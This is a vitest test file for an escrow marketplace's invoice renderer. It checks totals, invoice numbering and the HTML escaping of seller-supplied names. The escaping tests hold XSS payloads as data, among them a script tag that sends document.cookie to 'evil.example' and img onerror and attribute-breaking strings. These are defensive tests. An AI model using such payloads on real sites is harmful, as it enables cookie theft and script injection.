import { describe, it, expect } from "vitest";
import {
  buildInvoiceData,
  esc,
  invoiceNumber,
  micro,
  renderInvoiceHtml,
  renderInvoiceText,
} from "@/lib/order/invoice";

/**
 * The buyer's invoice is the only durable proof they get that they sent real
 * USDC to an escrow contract, so two things must hold:
 *
 *  1. THE NUMBERS MUST MATCH THE CHECKOUT SCREEN. `public/orders.jsx` shows
 *     `total = amount + adminFee`. An invoice that disagrees with the UI is
 *     worse than no invoice — it turns a receipt into a dispute.
 *  2. EVERY SELLER-CONTROLLED STRING MUST BE ESCAPED. Product names, variants and
 *     store names come from other users, and the invoice is delivered to the
 *     buyer's inbox wearing our branding. Unescaped, it is a phishing vector.
 */

const base = {
  order: {
    id: "3f9a2c1b-1111-2222-3333-444455556666",
    variant: null,
    qty: 2,
    amount: 1_000_000,
    buyer_fee: 20_000,
    payment: "wallet",
    status: "PAID",
    created_at: "2026-10-13T09:00:00.000Z",
    on_chain_order_id: "42",
    on_chain_tx_hash: "0xabc123",
  },
  productName: "Steam Account",
  storeName: "Rimuru Store",
  buyerEmail: "buyer@example.com",
  escrowAddress: "0x86feedea5c340f0fb0b0f9649691e87f5717b345",
  explorerBase: "https://testnet.arcscan.app/tx/",
  appUrl: "https://slimemarket.app",
  networkLabel: "Arc Testnet",
};

describe("order invoice", () => {
  it("numbers the invoice stably from the order id", () => {
    expect(invoiceNumber(base.order.id)).toBe("SM-3F9A2C1B");
    // Same order id in, same number out — a buyer quoting it must be unambiguous.
    expect(invoiceNumber(base.order.id)).toBe(invoiceNumber(base.order.id));
  });

  it("totals the way the checkout screen does (amount + buyer_fee)", () => {
    const d = buildInvoiceData(base);
    expect(d.subtotalMicro).toBe(1_000_000n); // 1.00 USDC
    expect(d.buyerFeeMicro).toBe(20_000n); //    0.02 USDC
    expect(d.totalMicro).toBe(1_020_000n); //    1.02 USDC
    expect(renderInvoiceText(d)).toContain("TOTAL PAID            1.02 USDC");
  });

  it("does NOT add platform-side fees the buyer was never charged", () => {
    // circle_fee / gas_fee exist on the row but are not part of the buyer's total.
    const d = buildInvoiceData({
      ...base,
      order: { ...base.order, circle_fee: 5_000, gas_fee: 7_000 },
    });
    expect(d.totalMicro).toBe(1_020_000n);
  });

  it("coerces every shape PostgREST can return for a bigint", () => {
    expect(micro(null)).toBe(0n);
    expect(micro(undefined)).toBe(0n);
    expect(micro(1_000_000)).toBe(1_000_000n);
    expect(micro("1000000")).toBe(1_000_000n); // bigints often arrive as strings
    expect(micro(10n)).toBe(10n);
    expect(micro("nonsense")).toBe(0n);
  });

  it("escapes a hostile product name instead of rendering it", () => {
    const payload = `<script>fetch('//evil.example?c='+document.cookie)</script>`;
    const d = buildInvoiceData({ ...base, productName: payload });
    const html = renderInvoiceHtml(d);

    expect(html).not.toContain("<script>");
    expect(html).not.toContain("</script>");
    expect(html).toContain("&lt;script&gt;");
    // The plain-text alternative must keep the literal string — it is not markup.
    expect(renderInvoiceText(d)).toContain("<script>");
  });

  it("escapes the store name and variant too", () => {
    const d = buildInvoiceData({
      ...base,
      storeName: `"><img src=x onerror=alert(1)>`,
      order: { ...base.order, variant: `" onmouseover="alert(1)` },
    });
    const html = renderInvoiceHtml(d);

    // The tag must be INERT: escaped, so the browser shows text instead of
    // building an <img>. The payload's own characters still appear literally —
    // that is fine and expected once the angle brackets are entities.
    expect(html).not.toContain("<img src=x");
    expect(html).toContain("&lt;img src=x");
    // The variant sits in a text node, so the dangerous part is the bare quote
    // that would otherwise close the surrounding attribute.
    expect(html).not.toContain('" onmouseover="');
    expect(html).toContain("&quot; onmouseover=&quot;");
  });

  it("esc() covers the five characters that matter", () => {
    expect(esc(`&<>"'`)).toBe("&amp;&lt;&gt;&quot;&#39;");
    expect(esc(null)).toBe("");
  });

  it("links the transaction when there is one, and omits it when there is not", () => {
    expect(renderInvoiceHtml(buildInvoiceData(base))).toContain(
      "https://testnet.arcscan.app/tx/0xabc123",
    );
    const noTx = buildInvoiceData({ ...base, order: { ...base.order, on_chain_tx_hash: null } });
    expect(renderInvoiceHtml(noTx)).not.toContain("arcscan.app/tx/");
  });

  it("renders a usable text fallback (no HTML-only content)", () => {
    const text = renderInvoiceText(buildInvoiceData(base));
    expect(text).toContain("SlimeMarket — Invoice SM-3F9A2C1B");
    expect(text).toContain("Rimuru Store");
    expect(text).toContain("held in escrow");
  });
});
